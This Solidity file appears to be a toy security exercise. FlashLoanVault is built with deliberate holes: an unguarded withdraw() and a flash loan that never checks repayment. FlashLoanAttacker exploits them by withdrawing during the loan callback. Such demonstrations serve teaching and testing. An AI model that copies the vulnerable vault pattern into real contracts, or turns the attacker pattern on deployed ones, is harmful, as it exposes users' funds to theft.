// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface IFlashBorrower {
    function receiveLoan(uint256 amount) external;
}

contract FlashLoanVault {
    uint256 public reserve;

    function seed(uint256 amount) external {
        reserve += amount;
    }

    function flashLoan(uint256 amount) external {
        require(amount <= reserve, "insufficient reserve");
        reserve -= amount;
        IFlashBorrower(msg.sender).receiveLoan(amount);
        reserve += amount;
    }

    function withdraw(uint256 amount) external {
        require(amount <= reserve, "insufficient reserve");
        reserve -= amount;
    }
}

contract FlashLoanAttacker is IFlashBorrower {
    FlashLoanVault public immutable vault;
    uint256 public extracted;

    constructor(FlashLoanVault _vault) {
        vault = _vault;
    }

    function attack(uint256 amount) external {
        vault.flashLoan(amount);
    }

    function receiveLoan(uint256 amount) external override {
        require(msg.sender == address(vault), "only vault");
        vault.withdraw(amount);
        extracted += amount;
    }
}
